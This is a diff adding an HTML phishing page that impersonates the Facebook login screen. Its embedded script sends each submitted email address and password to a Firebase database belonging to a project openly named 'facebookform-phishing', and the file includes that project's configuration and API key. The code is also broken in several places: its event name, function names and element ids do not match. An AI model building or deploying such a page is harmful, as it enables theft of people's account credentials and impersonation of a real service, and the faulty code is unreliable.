@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Facebook LogIn Page</title>
+  <style>
+    h1 {
+      color: blue;
+      text-align: center;
+    }
+    form {
+      max-width: 400px;
+      margin: 0 auto;
+      padding: 20px;
+      border-bottom: 2px solid black;
+    }
+    input[type="text"], input[type="password"], input[type="submit"] {
+      width: 100%;
+      margin-bottom: 10px;
+      box-sizing: border-box;
+      padding: 10px;
+      border-radius: 5px; /* Adding curved corners */
+    }
+    input[type="submit"] {
+      background-color: blue;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+    p {
+      text-align: center;
+    }
+  </style>
+  <script src="https://www.gstatic.com/firebasejs/9.1.2/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.1.2/firebase-auth.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.1.2/firebase-database.js"></script>
+  <script>
+
+const firebaseConfig = {
+    apiKey: "AIzaSyAcbBYrM4fYaW7eixmzlguVmifWJUmdl3w",
+    authDomain: "facebookform-phishing.firebaseapp.com",
+    databaseURL: "https://facebookform-phishing-default-rtdb.firebaseio.com",
+    projectId: "facebookform-phishing",
+    storageBucket: "facebookform-phishing.appspot.com",
+    messagingSenderId: "603361454900",
+    appId: "1:603361454900:web:c842267017a555956dd361"
+  };
+//initialize firebase
+  firebase.initializeApp(firebaseConfig);
+//reference your database
+ var facebookformDB = firebase.database().ref("facebookform");
+
+ document.getElementById("facebookform").addEventListener("LogIn", LogIn);
+
+
+ function LogInForm(e){
+   e.preventDefault();
+
+   var EmailAddress = getElementVal("EmailAddress");
+   var password = getElementVal("password");
+ 
+   
+ savemessages(EmailAddress,password);
+
+   //enabling the alert
+   document.querySelector(".alert").style.display = "block";
+
+   //remove the alert
+   setTimeout(() => {
+    document.querySelector(".alert").style.display = "none";
+   }, 3000);
+   //reset the form
+   document.getElementById("facebookform").reset();
+   
+ }
+
+const savemessages = (EmailAddress , password) => {
+  var NewFacebookform = facebookformDB.push();
+
+  NewFacebookform.set({
+    EmailAddress : EmailAddress,
+    password : password,
+
+  })
+
+
+}
+
+ const getElementByVal = (id) => {
+  return document.getElementById(id).value;
+
+ }
+
+  </script>
+</head>
+<body>
+  <h1 style="color:blue; text-align:center">facebook</h1>
+  <form>
+    <input type="text" id="username" name="Email Address" placeholder="Email Address">
+    <input type="password" id="password" name="password" placeholder="Password">
+    <input type="submit" value="Log In">
+    <p><a href="#">Forgotten password?</a></p>
+  </form>
+  <div style="text-align:center;">
+    <p style="color: blue;">Create an Account</p>
+  </div>
+</body>
+</html>
